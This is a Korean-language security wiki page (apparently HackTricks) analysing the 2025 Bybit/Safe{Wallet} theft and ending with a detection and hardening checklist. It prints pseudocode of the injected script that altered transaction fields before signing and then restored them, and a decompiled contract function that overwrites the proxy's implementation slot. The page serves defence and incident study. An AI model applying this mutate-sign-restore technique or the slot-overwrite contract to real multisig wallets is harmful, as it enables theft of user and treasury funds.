# Web3 서명 워크플로 침해 & Safe delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## 개요

콜드-월렛 절도 체인은 **Safe{Wallet} web UI의 공급망 침해(supply-chain compromise)**와 **프록시의 implementation 포인터(slot 0)를 덮어쓴 on-chain delegatecall 원시 기능(delegatecall primitive)**을 결합했습니다. 주요 요점은 다음과 같습니다:

- dApp이 서명 경로에 코드를 삽입할 수 있다면, 서명자를 공격자가 선택한 필드에 대해 유효한 **EIP-712 서명**을 생성하게 만들면서 원래 UI 데이터를 복원해 다른 서명자들이 눈치채지 못하게 할 수 있습니다.
- Safe proxies는 `masterCopy`(implementation)를 **storage slot 0**에 저장합니다. slot 0에 쓰는 계약으로의 delegatecall은 사실상 Safe를 공격자 로직으로 “업그레이드”하여 지갑에 대한 완전한 제어를 가능하게 합니다.

## Off-chain: Targeted signing mutation in Safe{Wallet}

변조된 Safe 번들(`_app-*.js`)은 특정 Safe + signer 주소를 선택적으로 공격했습니다. 주입된 로직은 서명 호출 직전에 실행되었습니다:
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### 공격 특성
- **Context-gated**: 피해자 Safes/서명자에 대해 하드코딩된 allowlists가 노이즈를 방지하고 탐지 가능성을 낮춤.
- **Last-moment mutation**: 필드(`to`, `data`, `operation`, gas)가 `signTransaction` 직전에 덮어써지고 이후 복원되었기 때문에 UI에 표시되는 proposal 페이로드는 정상적으로 보였지만 서명은 공격자 페이로드와 일치함.
- **EIP-712 opacity**: 지갑은 구조화된 데이터를 표시했지만 중첩된 calldata를 디코드하거나 `operation = delegatecall`을 강조하지 않아 변조된 메시지가 사실상 blind-signed됨.

### 게이트웨이 검증 관련성
Safe 제안은 **Safe Client Gateway**로 제출된다. 강화된 검사 이전에는 UI가 서명 후 필드를 재작성하면 `safeTxHash`/서명이 JSON 본문과 다른 필드에 대응하는 proposal을 게이트웨이가 수락할 수 있었다. 사고 이후에는 게이트웨이가 제출된 트랜잭션과 해시/서명이 일치하지 않는 proposal을 거부한다. 유사한 서버 측 해시 검증은 모든 signing-orchestration API에 적용되어야 한다.

### 2025 Bybit/Safe 사건 하이라이트
- 2025년 2월 21일 Bybit 콜드월렛 탈취(~401k ETH)는 같은 패턴을 재사용했다: 손상된 Safe S3 bundle은 Bybit 서명자에게만 트리거되었고 `operation=0` → `1`로 교체하여 `to`를 slot 0을 쓰는 미리 배포된 공격자 계약으로 지정했다.
- Wayback-cached `_app-52c9031bfa03da47.js`는 Bybit의 Safe (`0x1db9…cf4`) 및 서명자 주소를 키로 사용하는 로직을 보여주고, 실행 두 분 후 즉시 깨끗한 번들로 롤백되어 “mutate → sign → restore” 트릭을 반영했다.
- 악성 계약 (e.g., `0x9622…c7242`)은 단순한 함수 `sweepETH/sweepERC20`과 함께 구현 슬롯을 쓰는 `transfer(address,uint256)`를 포함했다. `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))`의 실행은 프록시 구현을 변경하여 완전한 제어권을 부여했다.

## 온체인: 슬롯 충돌을 통한 delegatecall 프록시 탈취

Safe 프록시는 `masterCopy`를 **storage slot 0**에 보관하고 모든 로직을 그쪽에 위임한다. Safe가 **`operation = 1` (delegatecall)**을 지원하기 때문에, 서명된 어떤 트랜잭션도 임의의 계약을 가리켜 프록시의 스토리지 컨텍스트에서 그 코드가 실행되게 할 수 있다.

공격자 계약은 ERC-20 `transfer(address,uint256)`를 흉내내었지만 대신 `_to`를 slot 0에 썼다:
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Execution path:
1. 피해자가 `execTransaction`에 서명 — `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe masterCopy가 이 파라미터들에 대한 서명을 검증합니다.
3. Proxy가 `attackerContract`로 delegatecall을 수행; `transfer` 본문이 slot 0을 기록합니다.
4. Slot 0 (`masterCopy`)가 이제 공격자 제어 로직을 가리킴 → **지갑 완전 탈취 및 자금 유출**.

### Guard & version notes (post-incident hardening)
- Safes >= v1.3.0는 `delegatecall`을 거부(veto)하거나 `to`/selectors에 대한 ACL을 강제하는 **Guard**를 설치할 수 있습니다; Bybit는 v1.1.1을 사용해 Guard 훅이 없었습니다. 이 제어 플레인을 확보하려면 계약 업그레이드(및 소유자 재등록)가 필요합니다.

## Detection & hardening checklist

- **UI integrity**: JS 자산을 pin하고 SRI 적용; 번들 변경사항을 모니터링; 서명 UI를 신뢰 경계의 일부로 취급하세요.
- **Sign-time validation**: **EIP-712 clear-signing**을 지원하는 하드웨어 지갑 사용; `operation`을 명시적으로 렌더링하고 중첩된 calldata를 디코드하세요. 정책에서 허용하지 않는 한 `operation = 1`일 때 서명을 거부하세요.
- **Server-side hash checks**: 제안서를 중계하는 게이트웨이/서비스는 `safeTxHash`를 재계산하고 서명이 제출된 필드와 일치하는지 검증해야 합니다.
- **Policy/allowlists**: `to`, selectors, 자산 유형에 대한 사전 검사 규칙을 적용하고 심사된 플로우를 제외하고는 delegatecall을 금지하세요. 완전 서명된 트랜잭션을 브로드캐스트하기 전에 내부 정책 서비스를 요구하세요.
- **Contract design**: 필요하지 않은 한 multisig/treasury 지갑에서 임의의 delegatecall을 노출하지 마세요. 업그레이드 포인터를 slot 0에서 멀리 두거나 명시적 업그레이드 로직과 접근 제어로 보호하세요.
- **Monitoring**: 재무 자금을 보유한 지갑에서의 delegatecall 실행 및 일반적인 `call` 패턴에서 `operation`을 변경하는 제안에 대해 경고를 생성하세요.

## References

- [AnChain.AI forensic breakdown of the Bybit Safe exploit](https://www.anchain.ai/blog/bybit)
- [Zero Hour Technology analysis of the Safe bundle compromise](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
